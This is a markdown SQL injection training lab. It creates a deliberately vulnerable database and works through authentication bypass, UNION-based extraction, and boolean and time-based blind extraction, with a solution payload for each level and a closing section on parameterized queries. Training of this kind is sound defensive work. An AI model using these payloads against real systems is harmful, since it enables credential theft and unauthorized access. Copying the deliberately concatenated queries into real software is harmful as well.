# FLLC SQL Injection Lab

Hands-on SQL injection training with progressive difficulty levels.

## Setup

```sql
-- Create the vulnerable test database
CREATE DATABASE fllc_injection_lab;
USE fllc_injection_lab;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL,
    email VARCHAR(100),
    role ENUM('user', 'admin', 'superadmin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE products (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100),
    price DECIMAL(10,2),
    category VARCHAR(50),
    description TEXT
);

CREATE TABLE orders (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    product_id INT,
    quantity INT,
    total DECIMAL(10,2),
    order_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id),
    FOREIGN KEY (product_id) REFERENCES products(id)
);

-- Seed data
INSERT INTO users (username, password, email, role) VALUES
('admin', 'hashed_admin_pass', 'admin@fllc.net', 'superadmin'),
('john', 'hashed_john_pass', 'john@example.com', 'user'),
('jane', 'hashed_jane_pass', 'jane@example.com', 'admin');

INSERT INTO products (name, price, category) VALUES
('Flipper Zero', 169.00, 'hardware'),
('USB Rubber Ducky', 79.99, 'hardware'),
('WiFi Pineapple', 119.99, 'hardware');
```

## Exercises

### Level 1: Authentication Bypass

The vulnerable query:
```sql
-- VULNERABLE: Direct string concatenation
SELECT * FROM users WHERE username = '$input' AND password = '$pass';
```

**Challenge:** Log in as admin without knowing the password.

<details>
<summary>Solution</summary>

```
Username: admin' --
Password: anything

-- Resulting query:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything';
```
</details>

### Level 2: UNION-Based Extraction

```sql
-- VULNERABLE: User-controlled input in ORDER BY / search
SELECT id, name, price FROM products WHERE category = '$input';
```

**Challenge:** Extract all usernames and passwords from the users table.

<details>
<summary>Solution</summary>

```sql
-- Step 1: Determine column count
' ORDER BY 3 --      -- Works
' ORDER BY 4 --      -- Error → 3 columns

-- Step 2: Find displayable columns
' UNION SELECT 1,2,3 --

-- Step 3: Extract data
' UNION SELECT username, password, email FROM users --
```
</details>

### Level 3: Blind Boolean-Based

```sql
-- VULNERABLE: Only returns true/false (product exists or not)
SELECT * FROM products WHERE id = $input;
```

**Challenge:** Extract the admin password character by character.

<details>
<summary>Solution</summary>

```sql
-- Check if first char of admin password > 'm'
1 AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 109

-- Binary search each character position
-- Automate with a script that tests ASCII ranges
```
</details>

### Level 4: Time-Based Blind

**Challenge:** Extract data when there's no visible output difference.

<details>
<summary>Solution</summary>

```sql
-- If first char > 'm', sleep 3 seconds
1; IF (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 109 WAITFOR DELAY '0:0:3' --

-- MySQL variant:
1 AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>109, SLEEP(3), 0)
```
</details>

## Prevention

```sql
-- SECURE: Parameterized queries (prepared statements)
-- Python example:
-- cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))

-- Java example:
-- PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
-- ps.setString(1, username);
-- ps.setString(2, password);
```

---

*FLLC 2026 — Authorized security testing only.*
